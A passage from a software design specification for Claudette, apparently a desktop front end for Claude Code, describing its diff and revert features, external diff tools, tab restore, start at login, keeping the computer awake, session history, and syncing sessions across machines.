- **Working tree vs HEAD.** Git is also asked for its counts with `--ignore-cr-at-eol`, which leaves out lines that differ only at their ends, the newline at the end included, and with `--raw` for each file's mode. A file whose counts differ shows the ones that leave the line ends out, as its diff does, and says its line endings changed: from what to what as `git ls-files --eol` has them, for a file with nothing staged (the index has HEAD's then); *the newline at its end* when they're the same kind; otherwise *"they differ from HEAD's"*, which is also what git says of a file checked out with other line endings than it would commit. A file whose mode changed says *"Only its mode changed: executable now"*. Git's copy at HEAD comes without its line endings, so a git row's diff says what the row says, and one whose lines are the same with nothing more to say reads *"The lines are the same as at HEAD. Git counts something else as changed, such as its byte order mark or encoding."*
- How it's built: Core's `HiddenChanges` (`Between`, with `LineEndingChange` and `ModeChange`), `TextFiles`, `ChangedFiles.NoteLineEndings` and `ChangedFile.BeforeLineEndings`, `BeforeContentStore.SaveLineEndings`, `TurnCount` and `GitChange.Hidden`; the App's `HiddenChangeText` writes the sentences, for `ChangedFileRow.Note`, `TurnFileRow.Stats` and the diff window, whose `DiffSource.Hidden` says what changed for the text it shows. `HiddenChangesTests`, `ChangedFilesTests`, `BeforeContentStoreTests` and `GitWorkingTreeTests` (Core), `ChangedFilesTrackingTests`, `DiffHiddenChangesTests` and `ChangesPerTurnTests` (the tab), `ToolWindowsUiTests` and `DiffWindowUiTests`, and `RealCliTests` against the real `claude`.

### Reverting

The diff view can put back what Claude changed, when it knows what the file held before:

- **Revert** on a hunk's header undoes just that change, leaving Claude's others.
- **Revert file** puts the whole file back as it was before Claude's first change, after asking in place (*Put the whole file back?*). A file Claude created is deleted.
- With Changed files showing git's changes, the diff is against HEAD, and so is the revert: the file goes back to HEAD, in the line endings it has now (git keeps its copy in the ones it was committed in). A file that isn't at HEAD, such as an untracked one that may be the user's own, has nothing to go back to: neither revert is offered, and it's never deleted.
- Either only writes if the file is still what the view showed: if Claude, or anything else, changed it since, nothing is written and the view says to refresh. Line endings, a missing newline at the end and a byte order mark are kept.
- The file keeps its encoding: UTF-8, or UTF-16 or UTF-32 when its byte order mark says so. A file that isn't valid text in one of those (Latin-1, say) isn't written, with a message saying why: reading it would mean guessing, and writing the guess back would change characters nobody touched.
- The file is written to a temporary name and renamed, as Claudette's own files are. A symbolic link is written through, to the file it points to, and stays a link; on macOS and Linux the file keeps its permissions, such as being executable. Changed files picks the change up as it does any other.

### Changes per turn

Changed files shows everything since the session started. The **Modified files** card at a turn's end shows what that turn changed, and the **Turn** card under it how the turn went ([§18](#conversation-cards)).

- **On the cards.** A turn that changed files with Edit, Write, MultiEdit or NotebookEdit, its subagents' included, ends with a **Modified files** card, headed *"3 files changed"*, with a tile for each file: its name, its counts beside it (`+12 −3`, from before the turn to how its last change left the file, so another tab's edits as it ended don't count) and its folder under it. Under it, a **Turn** card has the duration, tokens in and out, the model, what came from the prompt cache and the tool calls; a turn that changed nothing has the **Turn** card alone. Clicking a tile opens that file's changes in the turn.
- **A file's diff** opens in the diff view: the file before the turn's first change to it (that change's `originalFile`), against how the turn's last change left it ([This session's changes](#this-sessions-changes)). When that isn't known, it's how the next turn that changed the file found it (that turn's first `originalFile`); with none since, it's the file now, and the header says so: *"this turn's changes: before it, against the file now"*, and changes made outside Claude between turns count toward the earlier turn.
- The view only shows them: there's no **Revert** or **Reviewed**, which belong to the file's changes as Changed files shows them. A file whose "before" isn't known shows as it is, as in Changed files.
- **Open in diff tool**, when one is set, opens them in the external diff tool: the turn's "before" against the file itself when no later turn changed it, or against how the turn left it, both sides then temporary read-only files (`DiffToolLauncher.LaunchBetweenAsync`).
- **Only live turns.** A transcript has no end-of-turn cards, so a restored tab's earlier turns have none, and nor does a turn that was stopped or ended in an error: its changes are in Changed files only. Going back ([§5](#rewind-and-branch)) reads the conversation back without them.
- How it's built: `ChangedFiles` (Core) notes each live change's own "before" for the turn under way, and its last change's "after", and `TakeTurn` hands them over as the turn ends; `ChangedFilesViewModel` puts them on the **Modified files** card, keeps the turns in order to find the "after", and opens `DiffSource` with a fixed `After` and no revert. `ChangedFilesTests` (Core) and `ChangesPerTurnTests` (the tab).

### External diff tool

- In Settings → Files and diffs → **Diff tool**, the user chooses how diffs open: **Built-in** (the default), a **preset**, or a **custom command**.
- Once a tool is set, **Open in diff tool** appears on every changed file. Double-clicking a file in the changed files panel uses the external tool instead of the built-in view, and a single click only selects it; the built-in view stays in the file's menu.
- **Presets** are found automatically: Claudette looks in each tool's standard install locations and on `PATH` (the login shell's, [§13](#login-shell-environment)), and a preset only appears if its tool is found.

  | Tool | Windows | macOS |
  |---|---|---|
  | Beyond Compare | `BCompare.exe` | `bcomp` |
  | VS Code | `code --diff --wait` | `code --diff --wait` |
  | WinMerge | `WinMergeU.exe` | — |
  | Kaleidoscope | — | `ksdiff` |
  | Meld | `Meld.exe` | `meld` |
  | P4Merge | `p4merge.exe` | `p4merge` |
  | Your git difftool | `git difftool` (uses your git config) | same |

- A preset fills in the right arguments for the tool, including titles for each side (`auth.cs (before)` and `auth.cs (now)`). The left side is read-only where the tool supports it.
- **Custom command.** A program path plus an arguments template with the placeholders `{left}`, `{right}`, `{leftTitle}` and `{rightTitle}`. For example, Beyond Compare on Windows:

  ```
  "C:\Program Files\Beyond Compare 5\BCompare.exe" "{left}" "{right}" /title1="{leftTitle}" /title2="{rightTitle}"
  ```

- **Files passed to the tool.**
  - The "before" side is written to a temporary read-only file, in a folder of its own per launch. The file keeps its name and extension, for example `auth (before).cs`, so the tool picks the right language.
  - The "now" side is the real file in the working folder, so edits made in the diff tool are saved directly.
  - Temporary files are deleted when the tab closes.
- **Test** in Settings opens a sample diff so the user can check their command works.
- Only presets whose tool is installed are listed. Detection only looks for files, so opening Settings stays quick.
- **Batch-file safety.** On Windows, `.cmd` and `.bat` tools (VS Code's `code.cmd`, or a custom command) run through `cmd.exe`, where a file name could inject commands. Claudette refuses arguments that `cmd.exe` would interpret, such as `%` or `"`. The rare file name that trips this, for example `Q&A.md` in a path without spaces, can still be opened in the built-in view.

## 9. Sessions: History, Restore & Sync

### Restore on launch

- **Pinned tabs** ([§4](#4-tabs--sessions)) are always restored.
- **Unpinned tabs** that were open when Claudette quit are only restored if **Also restore unpinned tabs when Claudette starts** is on in Settings → General.
  - It's on by default, so a launch that isn't a restart handover ([Working on Claudette](#working-on-claudette), [§2](#updating-claudette)), such as after an update installed by hand, still brings back every tab.
  - 0.2.0 and earlier had it off by default. A settings file they saved keeps that value, so it stays off there until it's turned on, or the **Reset to defaults** of General's **Starting and closing** is used.
- **What's restored** for each tab:
  - Folder, name, mark, pinned state, whether it syncs, and group order.
  - Session ID, model, effort and per-tab overrides.
  - Suffixes kept on the tab, and token stats.
  - The unsent message in its composer ([§5](#drafts-and-the-stash)).
  - The changed files ticked as reviewed ([§8](#8-file-changes--diff-view)), and whether every one is, for the row's reviewed icon ([§4](#4-tabs--sessions), "Marks").
- Tabs come back in the same order and resume their sessions, with the earlier conversation loaded so you can scroll back.
- **Starting fast.** Restored tabs don't start their `claude` process until you first select them or send them a message. Launching with many pinned tabs is quick, and tabs you don't touch use no resources.
  - Reading a tab's earlier conversation happens off the UI thread, a line at a time (a long session's transcript can be tens of MB), and the conversation view takes it in as one change rather than one per message.
- **Old sessions.** Claude Code deletes local transcripts after 30 days by default. A pinned tab you haven't used in a while could lose its transcript, so Claudette resumes from its session library copy, which isn't affected by that cleanup. Only a tab that syncs, or once did, has a library copy. If there is one, it's used whether or not the tab syncs now. If neither copy exists, the tab says so and waits: **Start a new session** starts one in the same folder, keeping the tab's name, pinned state, overrides and suffixes, and **Unpin and close** (**Close tab**) closes it. It doesn't start a new session by itself.
- **Missing folder.** If a restored tab's folder no longer exists (for example a deleted clone), the tab shows an error as soon as it's restored, with **Choose folder…** and **Unpin and close** (**Close tab** for an unpinned tab).
  - **Choose folder…** is for a folder that moved, or another clone of the same project. The tab moves to the chosen folder's group and its session carries on there.
  - Claude Code finds sessions by folder, so Claudette copies the transcript to its local working folder and resumes from that file, as for a session from another machine ([Session library](#session-library-sync-across-machines)).
- **Carried on elsewhere.** A tab that syncs can come back to a session another machine carried on while Claudette was closed here. If that machine still has it open, the tab becomes read-only ([One machine at a time](#session-library-sync-across-machines)). If it has closed Claudette since, the tab picks up where that machine left off, from the library's copy rather than this machine's older transcript, and the conversation ends with *"Picked up where LAPTOP-02 left off at 12:04."* where it would say *"Resumed."*. A sync client may still be bringing that machine's turns as Claudette starts, so the tab keeps looking while it's open ([One machine at a time](#session-library-sync-across-machines)).
- Pinned tabs belong to this machine. On another machine, the same sessions appear in History ([below](#history)) instead.

### Starting at login

**Start Claudette when I log in** (Settings → General, off by default) starts Claudette when the user logs in to this computer. The setting lives in the OS rather than in `settings.json`, so it's this machine's, doesn't sync, and **Reset to defaults** leaves it.

- **How it opens.** Minimized to the taskbar or Dock, without taking focus, and with tabs restored as on any launch ([above](#restore-on-launch)). If the window was maximized, it comes back maximized. A login start while Claudette is already running does nothing.
- **The entry**, one per user:
  - **MSIX:** the package's startup task (`windows.startupTask` in the manifest, task `ClaudetteAtLogin`), turned on and off with `StartupTask`. It's listed as Claudette in Task Manager's Startup apps. Windows starts it without arguments; Claudette tells from its activation (`AppInstance.GetActivatedEventArgs`, `ActivationKind.StartupTask`).
  - **Other Windows builds:** a `Claudette` value under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
  - **macOS:** a LaunchAgent, `~/Library/LaunchAgents/com.dotbunny.claudette.login.plist`, run once at login. For `Claudette.app` it runs `open -a <the app> --args --login`. A LaunchAgent works on macOS 12, which the package still supports, and for a source build, which has no bundle; `SMAppService` needs macOS 13 and a bundle.
  - **Linux:** `claudette.desktop` in the XDG autostart folder (`$XDG_CONFIG_HOME/autostart`, or `~/.config/autostart`).
  - Every entry but the MSIX's starts Claudette with `--login`, which says it was started at login.
  - **A build's .NET** (`LoginDotnet`). On macOS and Linux a build other than `Claudette.app` is started with its own program only when that finds the .NET Claudette runs on with none of a terminal's environment, as .NET's launcher looks: the folder `/etc/dotnet/install_location_<processor>` names, else `/etc/dotnet/install_location`, else `/usr/local/share/dotnet` on macOS and `/usr/share/dotnet` on Linux. Otherwise, as for a .NET in `~/.dotnet` from Microsoft's install script, which a login doesn't put in `DOTNET_ROOT`, it runs that .NET's `dotnet` with `Claudette.dll`. On Windows a build keeps its program, since `dotnet.exe` is a console program and would open a console window.
- **Which Claudette starts.** A machine can have an installed release, another build (an unpackaged Windows one, a Linux one) and source builds in one or more checkouts. The entry starts the best one: a release (MSIX or `Claudette.app`), then another build, then a source build.
  - Each Claudette that isn't a source build notes itself in this machine's state when it starts: the MSIX by its package family, `Claudette.app` by its path, another build by its folder. That's how a source build finds the release. A release that was never opened isn't known. A better release that's still installed keeps its place; between two of the same kind, the one that started last wins.
  - Turning it on from a source build starts the release when there is one, and the switch says so: *"It starts the installed Claudette 0.3.0 rather than this source build."*
  - A source build's entry starts its build output, not the copy it runs from, so at login it copies and runs the newest build ([Working on Claudette](#working-on-claudette)). Between source builds, the entry keeps the checkout it has while that checkout is there.
  - Any Claudette started with `--login` hands over to a better copy when one is installed: it starts that copy with `--login` and exits.
  - When a Claudette starts, it tidies the entry without turning it on or off. A release replaces an entry that starts a source build, and an entry whose copy is gone (a deleted checkout, an uninstalled release) starts the best copy left.
- **The MSIX.** Only the package can turn its own startup task on or off.
  - A source build turning it on while the MSIX's task is off writes the Run value for itself. At login it hands over to the MSIX (`IApplicationActivationManager`, with `--login`). The MSIX then turns on its task and removes the Run value.
  - While the MSIX's task is on, the switch in a source build is on but disabled: *"The installed Claudette 0.3.0 starts at login. Turn it off in that Claudette, or in Task Manager's Startup apps."* The source build knows the task is on because the MSIX notes it with itself.
- **Turned off outside Claudette.** Only the user can turn these back on, so the switch shows them off and disabled, and says where to turn them on:
  - Task Manager's Startup apps can turn off the MSIX's task (`DisabledByUser`) or the Run value (a value of the same name under `Explorer\StartupApproved\Run` whose first byte is odd). Removing the Run value also removes that note, so a later entry starts out turned on.
  - An organization's policy can hold the MSIX's task on or off; the switch says which.
  - On Linux, a file with `Hidden=true` or `X-GNOME-Autostart-enabled=false` is off.
  - macOS can turn off the LaunchAgent under **Allow in the Background** in System Settings → General → Login Items. Claudette doesn't read that.
- **Not with `CLAUDETTE_HOME`.** A Claudette started with `CLAUDETTE_HOME` (to try things against the mock) leaves the entry alone and disables the switch, since the entry would start Claudette without it.

> **Not yet tested on a real machine:** the MSIX's startup task, its activation and the handover to it, which need an installed package; and the LaunchAgent on macOS. The manifest passes `makeappx`'s schema check. Choosing the copy, the Run value (in a test key), the LaunchAgent and autostart files, the .NET a build is started with, and the minimized start are covered by tests. An autostart file's command for a build on `~/.dotnet` was also run on Linux the way a login runs it, with no `DOTNET_ROOT`.

### Keeping the computer awake

✅ Built 2026-10-11. **Keep this computer awake** (Settings → General, off by default) holds off system sleep, so a task a usage limit stopped can carry on by itself when the limit resets, hours later ([§6](#continuing-after-a-limit-resets)), and sleep doesn't cut off a long turn. Only sleep: the screen can still turn off and the screensaver can still start. Closing a laptop's lid may still put it to sleep. It's this machine's and doesn't sync.

- **When.**
  - **Only while Claude has work to finish**, the default once it's on: while a tab runs a turn (not one waiting on the user, who may not be there to answer), Claude Code keeps tasks or agents running in the background in any tab ([Running tasks](#running-tasks)), or a task waits for a usage limit to reset to carry on by itself (not one that won't: after **Don't continue**, or a reset more than a day away). Once there's none, it holds on two minutes more, since the next turn often starts straight after (a queued message, a check-in), then lets go, and the computer sleeps as the OS's own settings say.
  - **Whenever Claudette is running**, from its start until it closes.
- **The header's cup.** In the usage header, after the processes' total ([§4](#process-monitor)), a cup is the same switch: a click turns it on or off, and right-click chooses when, which turns it on too. The cup takes the accent color while it's on, and steams while sleep is held off, for any reason, tabs connected to the Claude app included ([§18](#remote-control-the-claude-app)). Its tooltip says what's happening and why: *"Keeping this computer awake. The screen can still turn off."*, *"While Claude has work to finish: 2 tabs working, 1 tab waiting for a usage limit to reset."*, *"Click to let it sleep."*, *"Right-click to choose when."* Where Claudette can't keep the computer awake (Linux without `systemd-inhibit`), the cup is disabled and says why, and so does the setting.
- **How it's built.** The same `ISleepBlocker` that keeps the computer awake for the Claude app ([§18](#remote-control-the-claude-app)): `SetThreadExecutionState` on Windows, `caffeinate -i` on macOS, `systemd-inhibit --what=sleep` on Linux, whose reason says *"Claudette is keeping this computer awake"*. `Services/KeepAwakeService` holds it for every reason, and `ShellViewModel.OnTabWorkChanged` tells it what Claude has on. Diagnostics (Settings → Advanced) says whether the setting is on, what it's waiting on, and whether the computer is being kept awake. `KeepAwakeTests` (the setting, the cup's switch and menu, the work that counts, the two minutes) and `MainWindowTests` (the cup, rendered).

### History

- **History** (`Ctrl/Cmd+Shift+H`, or from the new tab menu) lists past sessions, grouped by folder, the folder used most recently first. Each entry shows the name/title (after the session's [mark](#4-tabs--sessions), if it has one), the machine it was last used on, last activity time, first prompt and message count, and for a session in the library, what it takes there (*312 MB in the library*): its folder, as a tab's **Sync size** counts it ([Writing](#session-library-sync-across-machines)), or a conflict copy's own transcript. It's read with the library's records, off the UI thread.
  - A session in a worktree Claude Code made (`<repo>/.claude/worktrees/<name>`, [§4](#worktree-tabs)) is listed under its repository's folder, as its tab is in the sidebar, and says *worktree brisk-otter* in place of its branch, `worktree-brisk-otter`; another branch is shown as well.
  - **Close**, `Esc` or a click outside it closes it without opening anything.
- **Projects.** ✅ Built 2026-10-10. A row of chips under the search box lists only one project's sessions: **All**, then the five folders used most recently, then **+N more**, which opens a list of the rest with their paths. Each chip shows how many of its sessions the search matches, the replies' matches included, and the chips keep their order as the search changes.
  - Picking one lists only that folder's sessions; **All**, or the selected chip again, lists every folder's. One picked from **+N more** takes the last chip's place while it's selected, so the selection always shows.
  - History opens on **All**, however it's opened, except from **History for this folder** in a sidebar group's menu ([§4](#4-tabs--sessions)), which opens on that group's folder. Its chip is there even before its sessions are read, and if it has none, History says *"No sessions in orbit-game yet."*
  - The list is one list of folder headings and sessions, built only as far as it's on screen, so a History of thousands of sessions opens as quickly as a short one.
  - With nothing listed yet, as when it opens, sessions show as they're read, so the top of the list is there before the rest is read. The library's records are read first, since they name sessions and say when another machine used one since; then Claude Code's transcripts, the most recently written first. Sessions only in the library join when the transcripts are all read.
  - It holds still while it updates: **Refresh** keeps the list in place until the new one replaces it (*"Reading your sessions…"* shows only when there's nothing yet), and **Search Claude's replies too** is disabled rather than hidden while it searches.
- Search by title, folder and prompt text: every prompt of a session, not just the first (up to about 1,000 characters of each and 16,000 per session, kept in History's cache). The list follows once typing pauses (150 ms), matched off the UI thread.
- **Search Claude's replies too** (a button under the results, or Enter in the search box) looks through the replies of the sessions the search didn't match. Replies aren't kept in the cache, so it reads each transcript then, off the UI thread, skipping lines cheaply as the scan does; sessions appear as they're found, the list following once for however many arrive together. A session matches when every word is in its title, prompts, folder or Claude's replies (subagents' and tool calls don't count), and shows the start of the reply that matched, around the word. Typing again, or **Refresh**, drops those results.
- Opening an entry resumes that session in a new tab. The earlier conversation is loaded into the view so you can scroll back through it. A session that's already open in a tab just selects that tab. The tab syncs if the session came from the library or has a library record ([Which tabs sync](#session-library-sync-across-machines)).
- History combines two sources:
  - Claude Code's own session storage on this machine, so it includes sessions started in the terminal.
  - Claudette's session library (below), which can include sessions from other machines.
- The sidebar can list the same sessions under their folders, with **Show Claude Code's projects in the sidebar** ([§4](#sidebar), "Claude Code's projects"); it reads them as History does.
- **Merging the sources.** A session in both is one entry: the library adds its name and, when another machine used it more recently, that machine. A session only in the library (from another machine, or older than Claude Code's cleanup) opens through "Restoring on another machine" below, and so does a session in both that another machine carried on since this machine's copy: the library's copy is the newer one.
- Opening a session applies its record's per-tab overrides (model, effort, mode, check-ins, process monitor). Records written before overrides were kept apply their model and effort.
- It also brings back the record's reviewed files ([§8](#8-file-changes--diff-view)), found in this machine's copy of the session's folder. **Open a copy** keeps them too, since the copy has the same changes.
- **Speed.** History reads every transcript line by line, skipping lines cheaply before parsing them, several files at once (one fewer than the processor's cores, up to 8), and caches each file by size and date, so opening it again only reads what changed. A transcript that only grew, as an open session's does each turn, is read on from where the last read stopped, once the bytes it stopped at are checked to be still there (otherwise it's read again from the start); the 32 most recently written files keep what that needs. The library's copies of sessions not on this machine are cached the same way.

### Session library (sync across machines)

Claudette keeps its own **session library** in a folder the user chooses (Settings → Sessions). By default it's in the app data folder. Pointing it at a folder that a sync client keeps up to date, such as Google Drive for desktop, Dropbox or OneDrive, lets other machines see and restore the same sessions. Claudette doesn't talk to Google Drive or any cloud API; it just reads and writes files, and the sync client does the rest.

**Which tabs sync.** Syncing is per tab, and opt-in. It's for work you know you'll pick up on another machine, without bringing everything over.

- A tab that doesn't sync never writes to the library: no transcript copy, no record and no lease.
- **Sync to other machines**, in the tab's menu and in **Tab settings…**, turns it on or off ([§4](#4-tabs--sessions)). It's the tab's own state, saved with it, not a per-tab override.
- **Turning it on** copies the session to the library straight away, or when the turn ends if one is running. The tab takes the lease with that copy, as a new library session does. If another machine has the session open (a live lease), sync stays off and the tab says so, since copying from here would overwrite what the other machine wrote. So it does when another machine carried the session on in the library since this tab last synced it, and this tab has turns since too ([One machine at a time](#session-library-sync-across-machines)): *"LAPTOP-02 carried this session on in the session library since this tab last synced it, so syncing it from here would lose those turns. Sync stays off; open the session from History to go on with them."*
- **Turning it off** stops the copying and releases this tab's lease. The copy already in the library stays as it was, so other machines can still open it.
- **Sync now**, in the menu of a tab that syncs, copies the session to the library straight away rather than after the next turn (see **Writing**). It's for catching the library up without sending a message: after a copy that failed because the library folder wasn't available, after renaming the tab, or before leaving the machine.
  - It copies every file again, even one that looks unchanged, and takes the lease as any copy does. Like any copy, it never writes over turns another machine added ([One machine at a time](#session-library-sync-across-machines)).
  - It's disabled, with the reason as its tip, while a turn runs (the copy follows when it ends), before the session's first message (and a copy's, until it has its own id), and while the tab is read-only.
  - Leases are only refreshed once a minute, so it checks the lease first. If another machine has taken the session over, it writes nothing, and the tab becomes read-only as the refresh would have made it.
  - It says in the conversation how it went: *"Copied this session to the session library."*, or a warning with why it couldn't (the folder isn't available, or this machine no longer has the transcript).
- **New tabs** follow **Sync new tabs to the session library** (Settings → Sessions, off by default), however they're opened: the new tab picker, a group's `+`, `--folder`, Open Recent and the jump list, or a dropped folder.
- **Opening from History.** A session from the library (another machine's, or one continued elsewhere) or one with a library record opens with sync on: someone chose to sync it, so it keeps syncing wherever it's opened. So does **Open a copy** of one, under the copy's own id once its first turn gives it one. A session that only ever lived on this machine opens with sync off.
- A tab that doesn't sync also doesn't get the library's longer-term archive: once Claude Code cleans up its transcript, the session is gone ([Old sessions](#restore-on-launch)).

**What's in the library.** One folder per session holding:

- A **session record** (JSON): the tab name and mark ([§4](#4-tabs--sessions), "Marks"), model, effort, per-tab overrides, token stats, which machine last used it and when, when a tab last opened it (**Keeping sessions** below), the project identity (below), and the changed files ticked as reviewed ([§8](#8-file-changes--diff-view)). Their paths are relative to the session's folder, since that folder's path differs between machines; a file with no relative path from there, such as one on another drive, is left out.
- A **copy of Claude Code's transcript** (`.jsonl`), plus subagent transcripts.
- A **usage file** (`usage.json`), while machines share their usage: every machine's turns in the session, counts only ([§6](#sharing-across-machines)).

The library also holds `settings-sync.json` while settings sync ([§14](#settings-sync-optional)), a `usage` folder with a file per machine that shares its plan usage and, once usage was cleared on every machine, a note saying when ([§6](#sharing-across-machines)), and a `scratch` folder with the scratch pads of projects with a git remote ([§18](#scratch-pad)). The privacy note below covers the pads too.

Claude Code's credentials and settings are never copied.

**Writing.**

- For a tab that syncs, Claudette copies the transcript into the library after each turn finishes, never while Claude Code is writing it. It waits a second after the turn's result, so Claude Code has finished writing. Turning sync on, and **Sync now**, wait the same second.
- Each file is written to a temporary name, then renamed, so a sync client never uploads a half-written file. The record is written last, so a record in the library means its transcript is there too. On Windows the rename fails while anything has the file open, such as History reading a record, so it's tried again for a moment, and so is a read that meets a rename under way.
- A file that hasn't changed (same size, and a modified time within 2 seconds, since some synced drives store coarse times) isn't copied again, except by **Sync now**.
- A transcript only grows, so after a turn only its new lines are added to the library's copy, rather than the whole file written again after every turn. That's when the library's copy is the start of the transcript: shorter, with its first and last 64 KB the same as the transcript's there. Anything else, and **Sync now**, writes the whole file as above. A sync client can see the copy with a line half added; it uploads it again when the line is whole, and a session opened from the library only takes whole lines, so Claude Code never adds to a half line.
- A copy after a turn that fails, say because the library's drive isn't there, says so once in the conversation (*"Couldn't copy this session to the session library: … It's tried again after the next turn, or use Sync now."*), and again when one works (*"Copied this session to the session library again."*). Until then the library is missing turns, and nothing else would show it.
- Ticking a changed file as reviewed ([§8](#8-file-changes--diff-view)) copies the session 2 seconds after the last tick, so ticking several files writes the record once. Only the record has changed, so the transcript isn't copied again. During a turn, the copy as the turn ends carries the ticks.
- Library copies aren't affected by Claude Code's own cleanup of local transcripts (30 days by default), so the library also works as a longer-term archive for the sessions that sync, for as long as its own retention keeps them (**Keeping sessions** below).
- **What it takes.** ✅ Built 2026-10-23, from [issue #59](https://github.com/dotBunny/Claudette/issues/59). A long session's transcript, with images and long command output in it, can reach hundreds of megabytes, all of which the sync client uploads and keeps. So each copy, after a turn, on turning sync on and from **Sync now**, then measures the session's folder in the library: every file in it, the transcripts, the usage file, the record and a sync client's conflict copies, but not the lease, which only says who has it open and changes every minute, nor a file still being written.
  - A tab that syncs shows it as its **Sync size** on the info card ([§4](#4-tabs--sessions)), in the tip of its row's sync icon ([Sidebar](#sidebar)) and in **Tab settings…**, as *312 MB*, *1.4 GB*.
  - It's saved with the tab (`syncedSize`, with the session it was measured for), so a restored tab has it from launch without reading the library's drive. A tab that starts a session already in the library reads it with the lease as it starts, so one opened from History has it before its first turn.
  - Nothing shows before the session's first copy, while the tab doesn't sync, or for a session the tab has moved on from (after `/clear`, or going back to the start), until that session's own first copy.
  - History shows each library session's size too ([History](#history)), and Settings → Sessions the whole library's ([§14](#pages)).
  - **How it's built.** `SessionLibrary.GetSessionSize`, `Measure` and `LibraryEntry.Size` in Core, with `Formats.Size` writing it; `LibraryCopyResult.Copied` carries the size from `LibraryService`; `TabState.SyncedSize`, and `TabViewModel.Library.cs` (`SyncSize`, `SyncTip`). `SessionLibraryTests`, and `LibraryAndHistoryTests` in the app.

**Restoring on another machine.**

1. **Find the project.** Folder paths differ between machines (`D:\Repos\api` vs `/Users/me/src/api`), so the session record stores a project identity: the git remote URL, the branch, and the path inside the repo.
   - Remote URLs are compared in a normal form, so `git@github.com:Owner/Repo.git` and `https://github.com/owner/repo` match.
   - Claudette looks for a matching folder among the folders it remembered, recent and favorite folders, and open tabs, and prefers a clone on the recorded branch. Then it tries the recorded path, in case it exists here too.
   - If it can't find one, it asks the user to pick the folder and remembers the answer for that machine.
   - The identity is read from the `.git` folder's files (including worktrees), without running git. Whether there were uncommitted changes needs `git status`, so that part runs git.
2. **Check the code.** The library moves the conversation, not the code. If the branch or commit on this machine differs from what the other machine had, or the other machine had uncommitted changes, Claudette warns: *"This session was last used on DESKTOP-01 on branch `feature/auth` at `a1b2c3d`. This folder is on `main`. Claude's earlier file changes may not be here."* The user can continue anyway or cancel and sync the code first (push/pull).
3. **Resume.**
   - Claudette copies the library's `<session-id>.jsonl` to a local working folder (`<app data>/sessions/`) and resumes with `claude --resume <local path>`.
   - A working copy already there that's newer than the library's (modified later, or as late and at least as long) is kept: its last turns may not have reached the library. One the library's is newer than, because another machine carried the session on since, is replaced.
   - After each turn, it copies the file back to the library. The tab syncs, as any session opened from the library does, until it's turned off.

**How resuming from a file behaves** (confirmed by the spike):

- `--resume <path>` loads the full history and keeps the same session ID.
- Claude Code then writes the continued transcript, complete and not just the new turns, to `<session-id>.jsonl` in the **same folder** as the file it was given.
- Because the local working copy already has that name, Claude Code keeps writing to it. Resuming straight from the library folder would make Claude Code write live into the synced folder in the middle of a turn, which the library is designed to avoid.

> **Not yet tested:** resuming on macOS a transcript recorded on Windows, and the reverse. Transcripts store absolute paths (`cwd`, file paths in tool calls), so check this once a Mac is available.

**One machine at a time.**

- While a tab that syncs has its session open, Claudette keeps a small lease file next to it ("in use on DESKTOP-01", refreshed every minute). The tab takes the lease when it starts a session that's in the library; a new session gets one with its first library copy. A tab that doesn't sync ignores leases.
- A restored tab that syncs, whose session another machine holds a live lease on (it was taken over while Claudette was closed), becomes read-only instead of starting, and says where the session continued. A restored tab that doesn't sync starts from this machine's transcript as usual.
- Opening a session from History that another machine is actively using, whether its transcript is on this machine or only in the library, asks the user to either:
  - **Open a copy**, which forks it into a new session with `--fork-session`, or
  - **Take over**, after which the other machine's tab becomes read-only on its next sync.
- A lease that hasn't been refreshed in 10 minutes counts as stale.
- The lease names the machine and a random id for this run of Claudette, so two copies of Claudette on one machine are told apart.
- When a refresh finds another machine's name in the lease, the session was taken over. The tab stops its `claude` process, becomes read-only, and says where the session continued.
- Every copy to the library checks the lease first, as **Sync now** does, because leases are only refreshed once a minute. A turn that ends after another machine took the session over writes nothing, and the tab becomes read-only then rather than at the next refresh. The copy takes the lease last, so a lease of this run's means the copy finished.
- **Another machine's turns.** A lease only says who has a session open now. A machine that closed Claudette released its own, and a sync client can bring its turns minutes after this machine started the session, say when Claudette starts at login before Google Drive has caught up. So a tab that syncs also compares this machine's transcript with the library's, as it starts Claude Code, once a minute while Claude Code waits, before the first message after it starts, and before every copy to the library. A transcript only grows, so when one is the start of the other (its first and last 64 KB the same there, as for adding to a copy, **Writing**), the longer has everything the shorter does.
  - **The library's is ahead**: another machine carried the session on from where this one was. The tab picks those turns up. The library's transcript replaces the working copy, whatever the two files' times say, since they come from two machines' clocks; Claude Code starts again from it, and the conversation is read again, ending with *"Picked up where LAPTOP-02 left off at 12:04."* A message sent before the tab noticed isn't sent: it stays in the composer, and the conversation says *"Your message wasn't sent, so you can read it again against what's new. It's still in the composer."* The library's copy being longer only by a line a sync client is still bringing doesn't count.
  - **Each has turns the other doesn't**: the session went on here and on another machine, the other's turns reaching this machine only after this one's. Nothing writes over the library's. This machine's transcript is kept beside it as `<id>-<machine>.jsonl`, which History lists as a conflict copy (below), and the tab becomes read-only as after a take-over, releasing its lease: *"LAPTOP-02 carried this session on too, so copying this tab's turns to the session library would lose the ones made there. This tab's are kept there as a copy of their own, "DESKTOP-01" in History."* Either machine's turns open again from History. Kept apart again with the same turns, or more, the copy is brought up to date rather than another made; turns that went another way get `<id>-<machine>-2.jsonl`.
  - It counts on Claude Code only adding to a transcript it resumes, never writing it again, which a RealCli test checks (§16).
  - **How it's built.** `LibraryFiles.CompareTranscriptsAsync` and `LibraryStanding`, with `SessionLibrary.CompareAsync`, `PickUpAsync`, `SaveConflictCopyAsync` and `GetRecord`, in Core; `LibraryService.CompareAsync`, and its copy's `LibraryCopyResult.Ahead` and `Diverged`; `TabViewModel.Library.cs` (`CheckLibraryAsync`, `PickUpFromLibraryAsync`, `KeepApartAsync`). `SessionLibraryTests`, `LibraryAndHistoryTests` and `RealCliTests.A_working_copy_resumed_from_only_grows`.
- Turning sync off releases the lease: its file is deleted, with a moment's retries while a scanner or the search indexer holds it. A release and a write of the same session's lease never cross (the tab's turn finishing its copy just as sync is turned off): each waits for the other, so the release finds the file to delete rather than leaving it this run's until it's stale.
- A lease file that can't be read (a sync client half way through writing it, or a damaged one) isn't treated as free: nothing takes the lease or writes the session on the strength of it, a refresh leaves it alone, and retention keeps the session. A restored tab still starts from this machine's transcript, and the next copy looks again.
- If the sync client creates conflict copies (for example `session (1).jsonl`), Claudette shows them in History as separate, forked entries. It never merges them.
  - It recognizes the numbered copies Google Drive and OneDrive make, Dropbox's "conflicted copy", Syncthing's `.sync-conflict-…`, and `<id>-<machine>.jsonl`, which Claudette makes itself when a session went on in two places (above).
  - Opening one copies it to a folder of its own and resumes it with `--fork-session`, so it can't overwrite the working copy of the original.

